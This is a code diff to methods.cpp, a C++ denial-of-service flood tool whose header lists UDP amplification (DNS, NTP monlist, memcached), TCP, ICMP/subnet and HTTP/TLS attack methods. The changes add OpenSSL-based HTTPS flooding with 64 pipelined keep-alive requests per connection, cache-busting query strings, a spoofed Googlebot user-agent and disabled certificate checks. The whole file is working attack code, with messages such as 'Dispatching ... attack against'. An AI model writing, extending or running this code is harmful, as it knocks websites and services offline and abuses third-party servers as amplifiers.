@@ -1,5 +1,5 @@
 /*
- * methods.cpp — Lightweight, ultra-fast flood engine written in C++
+ * methods.cpp — Lightweight flood engine written in C++ (< 1 MB binary size)
  * Supports:
  *   L4 UDP: dns, udp, ldap, ssdp, ntp, memcached, home, udpbypass
  *   L4 TCP: tcp, socket, slowloris, ovh, tcpmix, tcpbypass, ack
@@ -7,7 +7,8 @@
  *   L3: subnet, icmp
  *   L7: http, https, httpx, browser, http2, tls, tlsx, bypass, cache, rapidflood, cloudflare
  *
- * Target binary size: < 1 MB (strictly achieved using optimized flags & standard POSIX sockets)
+ * All L7 methods automatically detect https/http, handle TLS/SSL handshake via OpenSSL,
+ * and use Googlebot user-agent.
  */
 
 #include <arpa/inet.h>
@@ -29,6 +30,9 @@
 #include <unistd.h>
 #include <vector>
 #include <atomic>
+
+#include <openssl/ssl.h>
+#include <openssl/err.h>
 
 static std::atomic<bool> g_running(true);
 static std::atomic<uint64_t> g_packets_sent(0);
@@ -62,7 +66,7 @@ static bool resolve_target(const std::string &host, struct sockaddr_in &addr, in
 
     struct addrinfo hints{}, *res = nullptr;
     hints.ai_family = AF_INET;
-    hints.ai_socktype = SOCK_DGRAM;
+    hints.ai_socktype = SOCK_STREAM;
 
     if (getaddrinfo(host.c_str(), nullptr, &hints, &res) != 0 || !res) {
         return false;
@@ -103,14 +107,11 @@ static void worker_udp(std::string host, int port, std::string method) {
     char buf[1460];
     int payload_size = 1024;
 
-    // Specific crafted payloads for game/amplification methods
     if (method == "dns") {
-        // Simple DNS query payload
         const char dns_q[] = "\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01";
         memcpy(buf, dns_q, sizeof(dns_q) - 1);
         payload_size = sizeof(dns_q) - 1;
     } else if (method == "ntp") {
-        // NTP monlist request
         const char ntp_q[] = "\x17\x00\x03\x2a\x00\x00\x00\x00";
         memcpy(buf, ntp_q, 8);
         payload_size = 8;
@@ -123,12 +124,10 @@ static void worker_udp(std::string host, int port, std::string method) {
         memcpy(buf, memc_q, sizeof(memc_q) - 1);
         payload_size = sizeof(memc_q) - 1;
     } else if (method == "samp") {
-        // SAMP query packet
         char samp_q[] = "SAMP\x00\x00\x00\x00\x00\x00\x69";
         memcpy(buf, samp_q, 11);
         payload_size = 11;
     } else if (method == "counter") {
-        // Source A2S_INFO
         const char src_q[] = "\xFF\xFF\xFF\xFF\x54Source Engine Query\x00";
         memcpy(buf, src_q, sizeof(src_q) - 1);
         payload_size = sizeof(src_q) - 1;
@@ -190,7 +189,6 @@ static void worker_tcp(std::string host, int port, std::string method) {
         return;
     }
 
-    // High speed TCP / Socket / OvH / TCPMix
     char junk[1024];
     rand_payload(junk, sizeof(junk));
 
@@ -211,7 +209,7 @@ static void worker_tcp(std::string host, int port, std::string method) {
 }
 
 // -------------------------------------------------------------
-// L3 ICMP / SUBNET FLOOD WORKER (Raw Socket if root, fallback to UDP)
+// L3 ICMP / SUBNET FLOOD WORKER
 // -------------------------------------------------------------
 static void worker_icmp(std::string host, int port, std::string method) {
     struct sockaddr_in target;
@@ -219,7 +217,6 @@ static void worker_icmp(std::string host, int port, std::string method) {
 
     int fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
     if (fd < 0) {
-        // Fallback to UDP if non-root
         worker_udp(host, port, "udp");
         return;
     }
@@ -237,7 +234,6 @@ static void worker_icmp(std::string host, int port, std::string method) {
         icmp->checksum = checksum(packet, sizeof(packet));
 
         if (method == "subnet") {
-            // randomize last byte of /24 subnet
             uint32_t cur = ntohl(target.sin_addr.s_addr);
             cur = (cur & 0xFFFFFF00) | (rand16() % 254 + 1);
             target.sin_addr.s_addr = htonl(cur);
@@ -250,39 +246,78 @@ static void worker_icmp(std::string host, int port, std::string method) {
 }
 
 // -------------------------------------------------------------
-// L7 HTTP FLOOD WORKER
+// L7 HTTP & HTTPS (TLS) FLOOD WORKER
 // -------------------------------------------------------------
-static void worker_http(std::string host, int port, std::string method) {
-    if (port <= 0) port = 80;
+static void worker_l7(std::string rawUrl, std::string method, SSL_CTX *ssl_ctx) {
+    bool isHttps = true;
+    std::string cleanHost = rawUrl;
 
-    std::string cleanHost = host;
-    if (cleanHost.rfind("http://", 0) == 0) cleanHost = cleanHost.substr(7);
-    if (cleanHost.rfind("https://", 0) == 0) cleanHost = cleanHost.substr(8);
+    if (cleanHost.rfind("https://", 0) == 0) {
+        isHttps = true;
+        cleanHost = cleanHost.substr(8);
+    } else if (cleanHost.rfind("http://", 0) == 0) {
+        isHttps = false;
+        cleanHost = cleanHost.substr(7);
+    }
+
+    int port = isHttps ? 443 : 80;
+
+    size_t colon = cleanHost.find(':');
     size_t slash = cleanHost.find('/');
+
     std::string path = "/";
     if (slash != std::string::npos) {
         path = cleanHost.substr(slash);
         cleanHost = cleanHost.substr(0, slash);
     }
 
+    if (colon != std::string::npos) {
+        size_t colon_end = (slash != std::string::npos && slash > colon) ? slash : cleanHost.length();
+        std::string port_str = cleanHost.substr(colon + 1, colon_end - colon - 1);
+        int p = std::atoi(port_str.c_str());
+        if (p > 0) port = p;
+        cleanHost = cleanHost.substr(0, colon);
+    }
+
     struct sockaddr_in target;
     if (!resolve_target(cleanHost, target, port)) return;
+
+    const std::string googlebot_ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
 
     while (g_running.load(std::memory_order_relaxed)) {
         int fd = socket(AF_INET, SOCK_STREAM, 0);
         if (fd < 0) continue;
 
         struct timeval tv;
-        tv.tv_sec = 2;
+        tv.tv_sec = 4;
         tv.tv_usec = 0;
         setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
         setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);
 
-        if (connect(fd, (struct sockaddr *)&target, sizeof(target)) == 0) {
-            std::string req;
-            const std::string googlebot_ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
+        int flag = 1;
+        setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
 
-            if (method == "httpx" || method == "cache" || method == "bypass" || method == "cloudflare") {
+        if (connect(fd, (struct sockaddr *)&target, sizeof(target)) != 0) {
+            close(fd);
+            continue;
+        }
+
+        SSL *ssl = nullptr;
+        if (isHttps && ssl_ctx) {
+            ssl = SSL_new(ssl_ctx);
+            SSL_set_fd(ssl, fd);
+            SSL_set_tlsext_host_name(ssl, cleanHost.c_str());
+            if (SSL_connect(ssl) <= 0) {
+                SSL_free(ssl);
+                close(fd);
+                continue;
+            }
+        }
+
+        // Send burst of pipelined / keep-alive requests per connection
+        for (int i = 0; i < 64 && g_running.load(std::memory_order_relaxed); i++) {
+            std::string req;
+            if (method == "httpx" || method == "cache" || method == "bypass" || method == "cloudflare" || method == "tlsx") {
                 req = "GET " + path + "?cb=" + std::to_string(rand32()) + " HTTP/1.1\r\n"
                       "Host: " + cleanHost + "\r\n"
                       "User-Agent: " + googlebot_ua + "\r\n"
@@ -300,10 +335,20 @@ static void worker_http(std::string host, int port, std::string method) {
                       "Connection: keep-alive\r\n\r\n";
             }
 
-            for (int i = 0; i < 50 && g_running.load(std::memory_order_relaxed); i++) {
-                if (send(fd, req.c_str(), req.length(), MSG_NOSIGNAL) <= 0) break;
-                g_packets_sent.fetch_add(1, std::memory_order_relaxed);
+            int bytesSent = 0;
+            if (ssl) {
+                bytesSent = SSL_write(ssl, req.c_str(), (int)req.length());
+            } else {
+                bytesSent = send(fd, req.c_str(), req.length(), MSG_NOSIGNAL);
             }
+
+            if (bytesSent <= 0) break;
+            g_packets_sent.fetch_add(1, std::memory_order_relaxed);
+        }
+
+        if (ssl) {
+            SSL_shutdown(ssl);
+            SSL_free(ssl);
         }
         close(fd);
     }
@@ -311,53 +356,96 @@ static void worker_http(std::string host, int port, std::string method) {
 
 // -------------------------------------------------------------
 // MAIN ENTRYPOINT
+// Usage:
+//   L4: ./flood <method> <host> <port> <time> [threads]
+//   L7: ./flood <method> <url> <time> [threads]
+//       ./flood <method> <url> <port> <time> [threads]  (backwards-compatible)
 // -------------------------------------------------------------
 int main(int argc, char *argv[]) {
-    if (argc < 5) {
-        std::cout << "Usage: " << argv[0] << " <method> <host/ip> <port> <time_seconds> [threads]\n";
-        std::cout << "Example: " << argv[0] << " udp 1.1.1.1 53 60 4\n";
+    if (argc < 3) {
+        std::cout << "Usage:\n"
+                  << "  L4: " << argv[0] << " <method> <host/ip> <port> <time_seconds> [threads]\n"
+                  << "  L7: " << argv[0] << " <method> <url> <time_seconds> [threads]\n";
         return 1;
     }
 
     std::string method = argv[1];
-    std::string host   = argv[2];
-    int port           = std::atoi(argv[3]);
-    int duration       = std::atoi(argv[4]);
-    int threads        = (argc >= 6) ? std::atoi(argv[5]) : (int)std::thread::hardware_concurrency();
+    std::string target = argv[2];
 
-    if (threads <= 0) threads = 2;
-    if (threads > 64) threads = 64;
-
-    std::cout << "[*] Starting " << method << " attack on " << host << ":" << port 
-              << " for " << duration << "s using " << threads << " thread(s)\n";
-
-    std::vector<std::thread> pool;
-
-    // Check category of method
     bool isL7 = (method == "http" || method == "https" || method == "httpx" ||
                  method == "browser" || method == "http2" || method == "tls" ||
                  method == "tlsx" || method == "bypass" || method == "cache" ||
                  method == "rapidflood" || method == "cloudflare");
 
-    bool isICMP = (method == "icmp" || method == "subnet");
+    int port = 0;
+    int duration = 0;
+    int threads = 4;
 
+    if (isL7) {
+        // If 3 arguments provided after target: ./flood <method> <url> <time> [threads]
+        // or 4 arguments: ./flood <method> <url> <port> <time> [threads]
+        if (argc == 4) {
+            duration = std::atoi(argv[3]);
+        } else if (argc >= 5) {
+            // Check if argv[3] is duration or port
+            // If argc == 5: could be (<url> <time> <threads>) OR (<url> <port> <time>)
+            if (target.find("http://") == 0 || target.find("https://") == 0 || std::atoi(argv[3]) > 65535) {
+                duration = std::atoi(argv[3]);
+                threads = std::atoi(argv[4]);
+            } else {
+                // If 4th arg is passed as port, check next arg as time
+                port = std::atoi(argv[3]);
+                duration = std::atoi(argv[4]);
+                if (argc >= 6) threads = std::atoi(argv[5]);
+            }
+        }
+    } else {
+        if (argc < 5) {
+            std::cout << "Usage for L4: " << argv[0] << " <method> <host> <port> <time> [threads]\n";
+            return 1;
+        }
+        port = std::atoi(argv[3]);
+        duration = std::atoi(argv[4]);
+        if (argc >= 6) threads = std::atoi(argv[5]);
+    }
+
+    if (duration <= 0) duration = 10;
+    if (threads <= 0) threads = 4;
+    if (threads > 128) threads = 128;
+
+    std::cout << "[*] Dispatching " << method << " attack against " << target 
+              << " for " << duration << "s (" << threads << " threads)\n";
+
+    SSL_CTX *ssl_ctx = nullptr;
+    if (isL7) {
+        SSL_library_init();
+        OpenSSL_add_all_algorithms();
+        SSL_load_error_strings();
+        ssl_ctx = SSL_CTX_new(TLS_client_method());
+        if (ssl_ctx) {
+            SSL_CTX_set_mode(ssl_ctx, SSL_MODE_ENABLE_PARTIAL_WRITE | SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER);
+            SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_NONE, nullptr);
+        }
+    }
+
+    std::vector<std::thread> pool;
+
+    bool isICMP = (method == "icmp" || method == "subnet");
     bool isTCP = (method == "tcp" || method == "socket" || method == "slowloris" ||
                   method == "ovh" || method == "tcpmix" || method == "tcpbypass" || method == "ack");
 
     for (int i = 0; i < threads; i++) {
         if (isL7) {
-            pool.emplace_back(worker_http, host, port, method);
+            pool.emplace_back(worker_l7, target, method, ssl_ctx);
         } else if (isICMP) {
-            pool.emplace_back(worker_icmp, host, port, method);
+            pool.emplace_back(worker_icmp, target, port, method);
         } else if (isTCP) {
-            pool.emplace_back(worker_tcp, host, port, method);
+            pool.emplace_back(worker_tcp, target, port, method);
         } else {
-            // L4 UDP & Game default
-            pool.emplace_back(worker_udp, host, port, method);
+            pool.emplace_back(worker_udp, target, port, method);
         }
     }
 
-    // Sleep for duration
     std::this_thread::sleep_for(std::chrono::seconds(duration));
     g_running.store(false, std::memory_order_release);
 
@@ -365,6 +453,10 @@ int main(int argc, char *argv[]) {
         if (th.joinable()) th.join();
     }
 
-    std::cout << "[+] Attack completed. Dispatched " << g_packets_sent.load() << " packets.\n";
+    if (ssl_ctx) {
+        SSL_CTX_free(ssl_ctx);
+    }
+
+    std::cout << "[+] Attack completed. Sent " << g_packets_sent.load() << " requests/packets.\n";
     return 0;
 }
